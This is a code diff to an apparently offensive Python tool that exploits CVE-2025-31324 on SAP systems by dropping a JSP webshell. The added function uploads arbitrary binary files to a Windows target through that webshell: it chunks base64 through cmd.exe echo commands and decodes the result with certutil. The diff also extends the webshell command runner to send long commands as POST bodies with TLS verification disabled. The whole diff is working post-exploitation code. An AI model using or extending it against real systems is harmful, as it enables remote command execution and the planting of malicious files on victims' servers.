@@ -628,16 +628,77 @@ def exploit_cve_2025_31324_dropshell(host: str, port: int,
     return result
 
 
+def write_file_via_shell(shell_url: str, target_path: str,
+                          content: bytes, chunk_size: int = 3000,
+                          timeout: float = 20.0) -> dict:
+    """Write a binary file to the target via a dropped JSP shell.
+
+    Chunks the content as base64 across multiple `cmd.exe /C echo >> file`
+    calls so we never exceed Windows' 8191-character cmd.exe command-line
+    limit.  Finishes with `certutil -decode` into the target path.
+
+    Returns dict {success, error, chunks_written}.
+    """
+    import base64 as _b64
+    b64 = _b64.b64encode(content).decode("ascii")
+    tmp = r"%TEMP%\sapmap_w.b64"
+    # Reset any stale tmp file from a previous run.
+    run_dropshell_command(shell_url, f'cmd.exe /C del /q "{tmp}" 2>nul',
+                           timeout=timeout)
+    chunks = 0
+    for i in range(0, len(b64), chunk_size):
+        chunk = b64[i:i + chunk_size]
+        op = ">" if i == 0 else ">>"
+        r = run_dropshell_command(
+            shell_url,
+            f'cmd.exe /C echo {chunk}{op}"{tmp}"',
+            timeout=timeout)
+        if not r.get("success"):
+            return {"success": False,
+                    "error": f"chunk {chunks+1} write failed: {r.get('error','?')}",
+                    "chunks_written": chunks}
+        chunks += 1
+    dec = run_dropshell_command(
+        shell_url,
+        f'cmd.exe /C certutil.exe -decode "{tmp}" "{target_path}"',
+        timeout=timeout)
+    # Cleanup best-effort
+    run_dropshell_command(shell_url, f'cmd.exe /C del /q "{tmp}" 2>nul',
+                           timeout=timeout)
+    out_text = " ".join(dec.get("output") or [])
+    if "FAILED" in out_text or ("ERROR" in out_text.upper()
+                                 and "certutil" in out_text.lower()):
+        return {"success": False,
+                "error": f"certutil decode failed: {out_text[:200]}",
+                "chunks_written": chunks}
+    return {"success": True, "error": "", "chunks_written": chunks}
+
+
 def run_dropshell_command(shell_url: str, command: str,
                            timeout: float = 20.0) -> dict:
     """Execute a single command via a previously-dropped JSP webshell.
 
     Parses the `<pre>...</pre>` block and returns `{success, output, error}`.
+
+    Short commands go as GET query strings; longer ones are sent as POST
+    form bodies to avoid URL-length limits (the J2EE HTTP stack rejects
+    URLs over ~8 KB with HTTP 400).
     """
     import urllib.parse as _up
     ctx = ssl._create_unverified_context()
-    url = shell_url + "?cmd=" + _up.quote(command)
-    req = urllib.request.Request(url, headers={"User-Agent": _UA})
+    # Threshold below the typical J2EE URL limit, with headroom for
+    # url-encoding expansion of special chars.
+    if len(command) < 3000:
+        url = shell_url + "?cmd=" + _up.quote(command)
+        req = urllib.request.Request(url, headers={"User-Agent": _UA})
+    else:
+        data = _up.urlencode({"cmd": command}).encode("ascii")
+        req = urllib.request.Request(shell_url, data=data,
+                                       headers={
+                                           "User-Agent": _UA,
+                                           "Content-Type":
+                                               "application/x-www-form-urlencoded"
+                                       })
     try:
         with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
             text = r.read().decode("latin1", errors="replace")
